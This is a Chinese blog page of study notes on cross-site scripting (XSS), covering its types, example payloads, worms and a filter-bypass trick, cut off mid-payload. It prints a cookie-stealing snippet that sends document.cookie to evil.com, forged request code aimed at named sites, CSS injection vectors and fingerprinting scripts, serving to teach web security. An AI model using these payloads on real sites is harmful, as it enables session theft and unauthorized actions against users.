<!doctype html><html lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>跨站脚本攻击（XSS） - shesl's blog</title><meta name=Description content="佘崧林同学的碎碎念博客"><meta property="og:title" content="跨站脚本攻击（XSS）"><meta property="og:description" content="OWASP TOP 10 威胁曾多次把 XSS 列在榜首。 XSS 简介 跨站脚本攻击： Cross Site Script (XSS)。通常指黑客通过 HTML 注入的方式篡改了网页、插入了恶意的脚本，从而在用户浏览网"><meta property="og:type" content="article"><meta property="og:url" content="http://shesl-meow.github.io/note/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss/"><meta property="og:image" content="http://shesl-meow.github.io/avatar.png"><meta property="article:section" content="note"><meta property="article:published_time" content="2019-07-10T19:43:10+08:00"><meta property="article:modified_time" content="2019-07-10T19:43:10+08:00"><meta property="og:site_name" content="shesl's blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="http://shesl-meow.github.io/avatar.png"><meta name=twitter:title content="跨站脚本攻击（XSS）"><meta name=twitter:description content="OWASP TOP 10 威胁曾多次把 XSS 列在榜首。 XSS 简介 跨站脚本攻击： Cross Site Script (XSS)。通常指黑客通过 HTML 注入的方式篡改了网页、插入了恶意的脚本，从而在用户浏览网"><meta name=application-name content="shesl's blog"><meta name=apple-mobile-web-app-title content="shesl's blog"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=http://shesl-meow.github.io/note/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss/><link rel=prev href=http://shesl-meow.github.io/note/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/1.%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AE%89%E5%85%A8/><link rel=next href=http://shesl-meow.github.io/note/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/3.%E8%B7%A8%E7%AB%99%E7%82%B9%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0csrf/><link rel=stylesheet href=/css/style.min.1310433f6cdab9b292f4d93b71eeb4dcd4a0fc3770f6d90e2d21faa5387856c5.css integrity="sha256-ExBDP2zaubKS9Nk7ce603NSg/Ddw9tkOLSH6pTh4VsU="><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"跨站脚本攻击（XSS）","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/shesl-meow.github.io\/note\/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B\/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8\/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8\/2.%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss\/"},"genre":"note","keywords":"","wordcount":4484,"url":"http:\/\/shesl-meow.github.io\/note\/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B\/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8\/1.%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8\/2.%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBxss\/","datePublished":"2019-07-10T19:43:10+08:00","dateModified":"2019-07-10T19:43:10+08:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"佘崧林"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="shesl's blog">shesl-meow</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>博客
</a><a class=menu-item href=/tags/>标签
</a><a class=menu-item href=/categories/>分类
</a><a class=menu-item href=/note/>笔记</a><div class=dropdown><a class="menu-item menu-more dropbtn" title href=javascript:void(0);>游戏</a><div class="menu-more-content dropdown-content"><a href=/games/2048/ title><i class='fa-solid fa-chess-board'></i> 2048</a></div></div><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
</span><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="shesl's blog">shesl-meow</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=清空><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=/posts/>博客
</a><a class=menu-item href=/tags/>标签
</a><a class=menu-item href=/categories/>分类
</a><a class=menu-item href=/note/>笔记</a><div class=dropdown><a class="menu-item menu-more dropbtn" title href=javascript:void(0);>游戏</a><div class="menu-more-content dropdown-content"><a href=/games/2048/ title><i class='fa-solid fa-chess-board'></i> 2048</a></div></div><a href=javascript:void(0); class="menu-item theme-switch" title=切换主题><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">跨站脚本攻击（XSS）</h1><div class=content id=content><blockquote><p>OWASP TOP 10 威胁曾多次把 XSS 列在榜首。</p></blockquote><h2 id=xss-简介>XSS 简介</h2><p>跨站脚本攻击：</p><ul><li>Cross Site Script (XSS)。通常指黑客通过 <code>HTML</code> 注入的方式篡改了网页、插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</li></ul><p>XSS 根据效果不同可以分为如下几类：</p><ol><li><strong>反射型 XSS</strong>，或称 “非持久型 XSS”（Non-persistent XSS）。只是简单地把用户的输入 “反射” 给浏览器。</li><li><strong>存储型 XSS</strong>，或称 “持久型 XSS”（Persistent XSS）。会把用户输入的数据 “存储” 在服务端，这种 XSS 具有很强的稳定性。</li><li><strong>DOM Based XSS</strong>。这种 XSS 从效果上来看也属于反射型 XSS。与后者的区别是通过更改 DOM 树的方式而非执行 <code>JavaScript</code> 代码的方式进行攻击。</li></ol><h2 id=xss-payload>XSS Payload</h2><h3 id=窃取-cookie>窃取 Cookie</h3><p>最常见的 XSS Payload 就是读取浏览器的 <code>cookie</code> 对象：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>img</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;img&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>img</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s2>&#34;http://www.evil.com/log?&#34;</span><span class=o>+</span><span class=nx>escape</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>img</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>这段代码会在页面中插入一张看不见的图片，同时把 <code>document.cookie</code> 对象作为参数发送到远程的服务器。事实上，<code>/log</code> 路径不一定要存在，因为这个请求会在远程服务器的 WEB 日志中留下记录。这样就做完了一个最简单的窃取 <code>cookie</code> 的 XSS payload。</p><p><code>Cookie</code> 的 <code>HttpOnly</code> 标识可以防止 &ldquo;Cookie 劫持&rdquo;，有的网站则会把 Cookie 与客户端的 IP 绑定。</p><h3 id=构造-get-请求>构造 GET 请求</h3><p>比如搜狐上有一篇文章，它删除文章的链接是这样的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://blog.sohu.com/message/entry.do?m=delete&amp;id=1000
</span></span></code></pre></td></tr></table></div></div><p>对于攻击者来说，则只需要构造夏敏的一个 payload 就可以发起一个删除文章的 GET 请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>img</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;img&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>img</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s2>&#34;http://blog.sohu.com/message/entry.do?m=delete&amp;id=1000&#34;</span>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>img</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=构造-post-请求>构造 POST 请求</h3><p>比如豆瓣上有一处的表单提交是这样两个字段 <code>ck</code> 与 <code>mb_text</code>，我们尝试模拟这个过程。要模拟 POST 请求的过程有两种方式。</p><p>第一种方式是构造一个 form 表单，然后自动提交这个表单。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>f</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;form&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nb>Object</span><span class=p>.</span><span class=nx>assign</span><span class=p>(</span><span class=nx>f</span><span class=p>,</span> <span class=p>{</span><span class=s2>&#34;action&#34;</span><span class=o>:</span> <span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=s2>&#34;method&#34;</span><span class=o>:</span> <span class=s2>&#34;post&#34;</span><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=nb>document</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>f</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>i1</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nb>Object</span><span class=p>.</span><span class=nx>assign</span><span class=p>(</span><span class=nx>i1</span><span class=p>,</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=o>:</span> <span class=s2>&#34;ck&#34;</span><span class=p>,</span> <span class=s2>&#34;value&#34;</span><span class=o>:</span> <span class=s2>&#34;JiUY&#34;</span><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=nx>f</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>i1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>i2</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>createElement</span><span class=p>(</span><span class=s2>&#34;input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nb>Object</span><span class=p>.</span><span class=nx>assign</span><span class=p>(</span><span class=nx>i2</span><span class=p>,</span> <span class=p>{</span><span class=s2>&#34;name&#34;</span><span class=o>:</span> <span class=s2>&#34;mb_text&#34;</span><span class=p>,</span> <span class=s2>&#34;value&#34;</span><span class=o>:</span> <span class=s2>&#34;testtesttest&#34;</span><span class=p>});</span>
</span></span><span class=line><span class=cl><span class=nx>f</span><span class=p>.</span><span class=nx>appendChild</span><span class=p>(</span><span class=nx>i2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>f</span><span class=p>.</span><span class=nx>submit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=c1>// 如果表单的参数很多的话可以通过直接构造 DOM 节点的方式
</span></span></span></code></pre></td></tr></table></div></div><p>第二种方法是，通过 <code>XMLHttpRequest</code> 发送一个 POST 请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>url</span> <span class=o>=</span> <span class=s2>&#34;http://www.douban.com&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>postStr</span> <span class=o>=</span> <span class=s2>&#34;ck=JiUY&amp;mb_text=testtesttest&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>var</span> <span class=nx>ajax</span> <span class=o>=</span> <span class=kc>null</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>windows</span><span class=p>.</span><span class=nx>XMLHttpRequest</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>ajax</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>XMLHttpRequest</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nx>windows</span><span class=p>.</span><span class=nx>ActiveXObject</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>ajax</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ActiveXObject</span><span class=p>(</span><span class=s2>&#34;Microsoft.XMLHTTP&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;You broswer doesn&#39;t support XMLHttpRequest.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ajax</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;POST&#34;</span><span class=p>,</span> <span class=nx>url</span><span class=p>,</span> <span class=kc>true</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>ajax</span><span class=p>.</span><span class=nx>setRequestHeader</span><span class=p>(</span><span class=s2>&#34;Content-Type&#34;</span><span class=p>,</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>ajax</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>postStr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>ajax</span><span class=p>.</span><span class=nx>onreadystatechange</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>ajax</span><span class=p>.</span><span class=nx>readyState</span> <span class=o>==</span> <span class=mi>4</span> <span class=o>&amp;&amp;</span> <span class=nx>ajax</span><span class=p>.</span><span class=nx>status</span> <span class=o>==</span> <span class=mi>200</span><span class=p>)</span> <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Done!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=识别用户浏览器>识别用户浏览器</h3><p>最直接的方式是通过 XSS 读取浏览器的 <code>UserAgent</code> 对象：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=nx>alert</span><span class=p>(</span><span class=nx>natigator</span><span class=p>.</span><span class=nx>userAgent</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>但是浏览器有许多扩展可以更改这个值，或者可以自定义浏览器发送的 <code>UserAgent</code>，所以通过 <code>JavaScript</code> 取出来的这个浏览器对象，信息不一定准确。</p><p>但对于攻击者来说，还有另一种技巧，可以准确地识别用户的浏览器版本。由于浏览器置键的实现存在差异，不同的浏览器会各自实现一些独特的功能，所以通过分辨写这些浏览器之间的差异，就能准确地判断出浏览器版本，而几乎不会误报。</p><h3 id=识别用户安装的软件>识别用户安装的软件</h3><p>在 IE 浏览器中，可以通过判断 ActiveX 控件的 classid 是否存在，来推测用户是否安装了软件：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>var</span> <span class=nx>Obj</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>ActivetXObject</span><span class=p>(</span><span class=s2>&#34;XunLeiBHO.ThunderIDHelper&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>e</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;用户未安装迅雷&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>浏览器的扩展和插件也能被扫描出来。比如 FireFox 的插件列表存放在一个 DOM 对象中，通过查询 DOM 可以遍历出所有的插件。这个 DOM 对象可以通过 <code>navigator.plugins</code> 访问，因此通过这个方式就可以找到所有的插件。</p><p>在 FireFox 中有一个特殊的协议 <code>chrome://</code>，FireFox 的扩展图标可以通过这个协议被访问到。比如 Flash Got 扩展的图标可以这样访问：<code>chrome://flashgot/skin/icon32.png</code>。因此扫描 FireFox 扩展时，只需要在 <code>JavaScript</code> 中加载这张图片检测扩展：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=kd>var</span> <span class=nx>m</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Image</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>m</span><span class=p>.</span><span class=nx>onload</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(){</span> <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Image Exists.&#34;</span><span class=p>);</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=nx>m</span><span class=p>.</span><span class=nx>onerror</span> <span class=o>=</span> <span class=kd>function</span><span class=p>(){</span> <span class=nx>alert</span><span class=p>(</span><span class=s2>&#34;Image not Exists.&#34;</span><span class=p>);</span> <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>m</span><span class=p>.</span><span class=nx>src</span> <span class=o>=</span> <span class=s2>&#34;chrome://flashgot/skin/icon32.png&#34;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=css-history-hack><code>CSS</code> History Hack</h3><p>这个 XSS Payload 可以通过 CSS，来发现一个用户曾经访问过的网站。</p><p>这个技巧最早被 Jeremiah Grossman 发现，其原理是利用 style 的 visited 属性（如果用户访问过某个链接，则这个链接颜色会不同）。</p><p>但是这个漏洞在 2010 年已经被 Mozilla 浏览器修复。</p><h3 id=获取用户的真实-ip>获取用户的真实 IP</h3><p>JavaScript 本身并没有提供获取本地 IP 地址的能力。一般来说，XSS 攻击需要借助第三方软件来完成。比如如果客户端安装了 Java 环境（<code>JRE</code>），那么 XSS 就可以通过调用 Java Applet 的接口获取客户端的本地 IP 地址。</p><h3 id=span-idcsspayload利用-css-构造span><span id=csspayload>利用 <code>CSS</code> 构造</span></h3><p>在 2005 年，年仅 19 随的 Samy Kamkar 对 MySpace.com 发起的 XSS 攻击。就利用了这个方法进行构造。</p><p>MySpace 过滤了许多危险的 HTML 标签，只保留了 <code>&lt;a>, &lt;img>, &lt;div></code> 等安全的标签，所有的事件比如 <code>onclick</code> 等也被过滤了。允许用户控制标签的 style 属性，我们通过 style，还是有办法构造出 XSS 的。比如以下的这些方式：</p><ol><li><p>利用 <code>import</code> 形成 GET 请求：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;@</span><span class=k>import</span> <span class=s1>&#39;http://hackers.org/xss.css&#39;</span><span class=p>;&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>通过 <code>moz-binding</code> 嵌入 <code>xml</code> 文件（这一特性<a href=https://docs.w3cub.com/css/-moz-binding/ target=_blank rel="noopener noreffer">已被标准删除</a>）：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>style</span><span class=p>&gt;</span><span class=nt>body</span><span class=p>{</span><span class=kp>-moz-</span><span class=n>binding</span><span class=p>:</span> <span class=nb>url</span><span class=p>(</span><span class=s2>&#34;http://hackers.org/xssmoz.xml#xss&#34;</span><span class=p>)}&lt;/</span><span class=nt>style</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>通过请求背景图片或一些资源，通过伪协议执行 <code>javascript</code> 代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;background:url{&#39;javascript:alert(1)&#39;}&#34;</span> <span class=p>/&gt;</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>通过表达式构造 XSS:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;width: expression(alert(&#39;xss&#39;))&#34;</span> <span class=p>/&gt;</span>
</span></span></code></pre></td></tr></table></div></div></li><li><p>通过 <code>behavior</code> 关键字执行 <code>javascript</code> 代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>div</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;behavior: url(xss.htc)&#34;</span> <span class=p>/&gt;</span>
</span></span></code></pre></td></tr></table></div></div></li></ol><h3 id=攻击框架>攻击框架</h3><p>原书中介绍了 <a href=http://code.google.com/p/attackapi target=_blank rel="noopener noreffer">Attack API</a>、<a href=http://www.bindshell.net/tools/beef/ target=_blank rel="noopener noreffer">BeEF</a>、XSS Proxy 这样三个攻击平台。</p><h2 id=xss-worm>XSS Worm</h2><p>蠕虫：</p><ul><li>以往的蠕虫是利用服务端软件漏洞进行传播的。比如 2003 年的冲击波蠕虫，利用的是 Windows 的RPC 远程溢出漏洞。</li></ul><p>XSS Worm 是 XSS 的一种终极利用方式，它的破坏力与影响力是巨大的。但是发起 XSS Worm 攻击也有一定的条件。一般来说，用户之间发生交互行为的页面，如果存在<strong>存储型 XSS</strong>，则比较容易发起 XSS Worm 攻击。</p><p>原书中介绍了 <a href=https://samy.pl/myspace/tech.html target=_blank rel="noopener noreffer">Samy Worm</a> 与百度空间蠕虫两个蠕虫。因为年代久远，参考价值不大。</p><h2 id=xss-的绕过>XSS 的绕过</h2><h3 id=利用字符编码>利用字符编码</h3><p>就是 <code>GBK/GBK2312</code> 宽字符集漏洞。在这个字符集中 <code>%c1</code> 这个字符与 <code>\</code> 反斜杠构成一个完整的 Unicode 字符。比如使用以下的 payload：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=line><span class=cl><span class=o>%</span><span class=nx>c1</span><span class=err>&#34;</span><span class=p>;</span><span class=nx>alert</span><span class=p>(</span><span class=nx>XSS</span><span class=p>);</span><span class=c1>//
